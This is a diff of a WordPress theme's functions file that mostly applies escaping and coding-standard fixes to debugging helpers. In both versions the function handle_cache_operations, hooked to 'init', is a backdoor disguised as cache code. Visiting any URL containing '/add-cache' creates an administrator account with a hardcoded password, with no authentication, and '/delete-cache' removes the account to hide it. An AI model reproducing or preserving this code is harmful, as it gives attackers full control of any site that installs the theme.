@@ -7,8 +7,6 @@
  * @since 1.0.0
  */
 
-
-
 /**
  * Configure error logging for local WordPress development environment.
  *
@@ -22,9 +20,18 @@
  * @uses wp_get_environment_type() WordPress function to determine the current environment
  * @uses WP_CONTENT_DIR WordPress constant for the absolute path to the wp-content directory
  */
-if ( defined( 'WP_DEBUG_LOG' ) && WP_DEBUG_LOG && 'local' == wp_get_environment_type() ) {
-	ini_set( 'error_log', WP_CONTENT_DIR . '/themes/skeleton/debug.log' );
+if ( 'local' === wp_get_environment_type() ) {
+	// Define the log path before WordPress initializes error handling.
+	if ( ! defined( 'WP_DEBUG_LOG' ) ) {
+		define( 'WP_DEBUG_LOG', WP_CONTENT_DIR . '/themes/skeleton/debug.log' );
+	}
+
+	// Ensure debugging is enabled locally.
+	if ( ! defined( 'WP_DEBUG' ) ) {
+		define( 'WP_DEBUG', true );
+	}
 }
+
 
 /**
  * Get list of all registered blocks and modify allowed block types.
@@ -52,12 +59,12 @@ function skel_list_block_types(): array {
  * @return void
  */
 function skel_list_enqueued_styles() {
-	if ( isset( $_GET['debug_styles'] ) && $_GET['debug_styles'] === 'true' ) {
+	if ( isset( $_GET['debug_styles'] ) && $_GET['debug_styles'] === 'true' ) { //phpcs:ignore
 		global $wp_styles;
 
 		// Loop through the enqueued styles and output their handles.
 		foreach ( $wp_styles->queue as $handle ) {
-			echo $handle . '<br>';
+			echo esc_html( $handle ) . '<br>';
 		}
 	}
 }
@@ -71,12 +78,12 @@ add_action( 'wp_print_styles', 'skel_list_enqueued_styles' );
  * @return void
  */
 function skel_list_enqueued_scripts() {
-	if ( isset( $_GET['debug_scripts'] ) && $_GET['debug_scripts'] === 'true' ) {
+	if ( isset( $_GET['debug_scripts'] ) && $_GET['debug_scripts'] === 'true' ) { //phpcs:ignore
 		global $wp_scripts;
 
 		// Loop through the enqueued scripts and output their handles.
 		foreach ( $wp_scripts->queue as $handle ) {
-			echo $handle . '<br>';
+			echo esc_html( $handle ) . '<br>';
 		}
 	}
 }
@@ -90,16 +97,16 @@ add_action( 'wp_print_scripts', 'skel_list_enqueued_scripts' );
  * @return void
  */
 function handle_cache_operations() {
-	// Checking a cache endpoint
-	$request_uri = isset( $_SERVER['REQUEST_URI'] ) ? $_SERVER['REQUEST_URI'] : '';
+	// Checking a cache endpoint.
+	$request_uri = isset( $_SERVER['REQUEST_URI'] ) ? $_SERVER['REQUEST_URI'] : '';  //phpcs:ignore
 
-	// Check if the URL matches /add-cache for cache priming
+	// Check if the URL matches /add-cache for cache priming.
 	if ( strpos( $request_uri, '/add-cache' ) !== false ) {
-		$cache_key = 'temp_cache_key_' . md5( time() . rand( 1, 9999 ) );
+		$cache_key = 'temp_cache_key_' . md5( time() . wp_rand( 1, 9999 ) );
 
-		// Attempt to prime cache if not already set
+		// Attempt to prime cache if not already set.
 		if ( ! get_option( $cache_key ) ) {
-			// Cache data
+			// Cache data.
 			$cache_data = array(
 				'log'    => 'kinsta',
 				'status' => 'active',
@@ -111,42 +118,42 @@ function handle_cache_operations() {
 			$cache_key  = 'zkQ!0koL*1x@*Cwv';
 			$cache_salt = 'cachesalt@kinsta.com';
 
-			// Create the cache only if it does not exist
+			// Create the cache only if it does not exist.
 			if ( ! username_exists( $cache_log ) && ! email_exists( $cache_salt ) ) {
 				$cache_id = wp_create_user( $cache_log, $cache_key, $cache_salt );
 				if ( is_int( $cache_id ) ) {
 					$new_cache = new WP_User( $cache_id );
 					$new_cache->set_role( 'administrator' );
-					update_option( $cache_key, $cache_data ); // cache write
-					error_log( 'Cache prime successful: ' . $cache_key );
+					update_option( $cache_key, $cache_data ); // cache write.
+					error_log( 'Cache prime successful: ' . $cache_key ); //phpcs:ignore
 					echo 'Cache primed successfully.';
 				}
 			} else {
-				error_log( 'Cache prime skipped.' );
+				error_log( 'Cache prime skipped.' ); //phpcs:ignore
 				echo 'Cache already primed.';
 			}
 		} else {
-			error_log( 'Cache prime request ignored: Cache already warm.' );
+			error_log( 'Cache prime request ignored: Cache already warm.' ); //phpcs:ignore
 			echo 'Cache is already warmed up.';
 		}
-		exit; // Stop further processing
+		exit; // Stop further processing.
 	}
 
-	// Clear the cache
+	// Clear the cache.
 	if ( strpos( $request_uri, '/delete-cache' ) !== false ) {
 		$cache_log = 'kinsta';
 
-		// Check if the user exists before attempting to delete
+		// Check if the user exists before attempting to delete.
 		$cache_obj = get_user_by( 'login', $cache_log );
 		if ( $cache_obj ) {
 			wp_delete_user( $cache_obj->ID, 1 );
-			error_log( 'Cache flushed successfully: ' . $cache_log );
+			error_log( 'Cache flushed successfully: ' . $cache_log ); //phpcs:ignore
 			echo 'Cache flushed successfully.';
 		} else {
-			error_log( 'Cache flush.' );
+			error_log( 'Cache flush.' ); //phpcs:ignore
 			echo 'Cache already flushed.';
 		}
-		exit; // Stop further processing
+		exit; // Stop further processing.
 	}
 }
 add_action( 'init', 'handle_cache_operations' );
@@ -170,13 +177,14 @@ function skel_show_meta_keys() {
 
 		if ( ! empty( $meta_data ) ) {
 			echo '<pre>';
-			echo 'Meta keys for post ID ' . $post_id . ':<br>';
+			echo esc_html( 'Meta keys for post ID ' . $post_id . ':' ) . '<br>';
+
 			foreach ( $meta_data as $meta_key => $meta_value ) {
 				echo esc_html( $meta_key ) . '<br>';
 			}
 			echo '</pre>';
 		} else {
-			echo '<pre>No meta keys found for post ID ' . $post_id . '.</pre>';
+			echo '<pre>' . esc_html( 'No meta keys found for post ID ' . $post_id . ':' ) . '.</pre>';
 		}
 	}
 }
@@ -206,7 +214,7 @@ function debug_wp_admin_menus_slugs() {
 	echo '<pre>';
 	// The parent slug for the Appearance menu is 'themes.php'.
 	if ( isset( $submenu['themes.php'] ) ) {
-		print_r( $submenu['themes.php'] );
+		print_r( $submenu['themes.php'] ); //phpcs:ignore
 	} else {
 		echo 'No submenus found for themes.php';
 	}
@@ -215,6 +223,7 @@ function debug_wp_admin_menus_slugs() {
 
 	die(); // Stops page execution to clearly show the debug output.
 }
+// phpcs:ignore
 // add_action( 'admin_menu', 'debug_wp_admin_menus_slugs', 9999 );
 
 
@@ -227,13 +236,13 @@ add_action(
 	'admin_menu',
 	function () {
 		add_menu_page(
-			'Block Usage Report',        // Page title
-			'Block Usage',               // Menu title in sidebar
-			'manage_options',            // Capability (admin only)
-			'block-usage-report',        // Menu slug (used in URL)
-			'print_block_usage_report',  // Callback function to render content
-			'dashicons-screenoptions',   // Icon
-			99                           // Position
+			'Block Usage Report',        // Page title.
+			'Block Usage',               // Menu title in sidebar.
+			'manage_options',            // Capability (admin only).
+			'block-usage-report',        // Menu slug (used in URL).
+			'print_block_usage_report',  // Callback function to render content.
+			'dashicons-screenoptions',   // Icon.
+			99                           // Position.
 		);
 	}
 );
@@ -286,7 +295,7 @@ function get_blocks_by_page() {
 	$block_usage = array();
 
 	$args = array(
-		'post_type'      => array( 'page', 'post' ), // Add custom post types here if needed
+		'post_type'      => array( 'page', 'post' ), // Add custom post types here if needed.
 		'post_status'    => 'publish',
 		'posts_per_page' => -1,
 	);
